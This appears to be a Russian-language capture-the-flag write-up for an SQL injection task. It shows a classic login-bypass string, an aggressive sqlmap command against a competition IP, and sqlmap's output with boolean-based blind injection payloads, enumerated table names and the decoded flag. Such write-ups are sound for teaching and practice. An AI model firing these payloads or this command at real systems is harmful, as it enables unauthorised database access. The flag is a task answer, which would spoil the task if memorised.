# ne SQLi

SQLi? - SQL injection

Первый запрос в гугл и допустим находим **1' OR 1=1 --**

Засылаем и...

![Task](img/view_task.png)

Смотрим f12, видим:

*Anime devo4ka govorit: "See url"*

и вправду, url довольно специфический:

*41726520796f75206c6f6767656420696e3f20416e64207468656e20776861743f20596f75207468696e6b20796f752063616e20646f20697420776974686f757420746f6f6c733f2061686168616861*

СyberChef + From hex:

*Are you logged in? And then what? You think you can do it without tools? ahahaha*

Намёк на тулзу прямой, а **sqlmap** как раз для этого:

```sh
$ sqlmap -u "http://46.254.20.217:2005/" --data="username=a222&password=1231&submit=Login" --level=5 --risk=3 --tables
...
sqlmap got a 302 redirect to 'http://46.254.20.217:2005/41726520796f75206c6f6767656420696e3f20416e64207468656e20776861743f20596f75207468696e6b20796f752063616e20646f20697420776974686f757420746f6f6c733f2061686168616861'. Do you want to follow? [Y/n] n
...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
...
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 978 HTTP(s) requests:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=a222&password=1231' OR NOT 7945=7945-- pdCF&submit=Login

Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=a222' OR NOT 3547=3547-- gURw&password=1231&submit=Login
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: username, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 0
[04:15:42] [INFO] the back-end DBMS is SQLite
web application technology: Nginx
back-end DBMS: SQLite
[04:15:42] [INFO] fetching tables for database: 'SQLite_masterdb'
[04:15:42] [INFO] fetching number of tables for database 'SQLite_masterdb'
[04:15:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[04:15:42] [INFO] retrieved: 9
[04:15:42] [INFO] retrieved: axwlitwwsg
[04:15:44] [INFO] retrieved: kvkdziemmd
[04:15:46] [INFO] retrieved: yfdvvikqkb
[04:15:47] [INFO] retrieved: bcjwtzgyxc
[04:15:49] [INFO] retrieved: mvticxxewh
[04:15:51] [INFO] retrieved: iacoayjemu
[04:15:52] [INFO] retrieved: tvzjxtuzjt
[04:15:54] [INFO] retrieved: 3468736c3333707b6e3333645f6631785f347537683072317a3474316f6e5f6d33687d
[04:16:07] [INFO] retrieved: 3468736c3333707b66616b655f666c61675f6c6f6c7d
Database: SQLite_masterdb
[9 tables]
+------------------------------------------------------------------------+
| 3468736c3333707b66616b655f666c61675f6c6f6c7d                           |
| 3468736c3333707b6e3333645f6631785f347537683072317a3474316f6e5f6d33687d |
| axwlitwwsg                                                             |
| bcjwtzgyxc                                                             |
| iacoayjemu                                                             |
| kvkdziemmd                                                             |
| mvticxxewh                                                             |
| tvzjxtuzjt                                                             |
| yfdvvikqkb                                                             |
+------------------------------------------------------------------------+
```

Видим странные название таблиц.

Заходим на CyberChef - From hex:

*3468736c3333707b66616b655f666c61675f6c6f6c7d - 4hsl33p{fake_flag_lol}*

*3468736c3333707b6e3333645f6631785f347537683072317a3474316f6e5f6d33687d - 4hsl33p{n33d_f1x_4u7h0r1z4t1on_m3h}*

Флаг - *4hsl33p{n33d_f1x_4u7h0r1z4t1on_m3h}*

<s>ps. У самого не с первого раза решается, всегда по разному, но главное танцевать с аргументами sqlmap'a! Название таска не просто так, лол.</s>